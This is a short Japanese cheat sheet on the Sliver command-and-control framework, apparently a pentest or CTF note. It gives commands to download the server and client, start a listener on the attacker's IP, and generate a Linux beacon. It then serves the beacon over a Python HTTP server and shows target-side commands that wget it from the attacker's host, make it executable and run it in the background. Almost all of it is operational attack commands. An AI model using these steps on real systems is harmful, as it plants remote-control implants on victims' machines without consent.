# Sliver C2とは
攻撃者が被害者のシステムを遠隔操作し、悪意ある活動を行うために使うC2フレームワーク。

## ダウンロード
```bash
wget https://github.com/BishopFox/sliver/releases/download/v1.5.44/sliver-server_linux # サーバー
wget https://github.com/BishopFox/sliver/releases/download/v1.5.44/sliver-client_linux # クライアント
```

## 使用方法（ターゲット: linux）
```bash
sliver-server # 起動
sliver> jobs # 稼働中のリスナー表示
sliver > <リスナー> -L <攻撃者のIP> --lport 443 # リスナーはhttps, http, mtlsから選ぶ
sliver >　generate beacon --http <リスナー名> --os linux --save <保存先パス> # ビーコンの生成
cd <保存したパス>
python3 -m http.server 8000
# ここからターゲット側で実行
wget http://<攻撃者のIP>:8000/<ビーコン名> -o /tmp/beacon
chmod +x /tmp/beacon
/tmp/beacon & # &でバックグラウンド実行
```
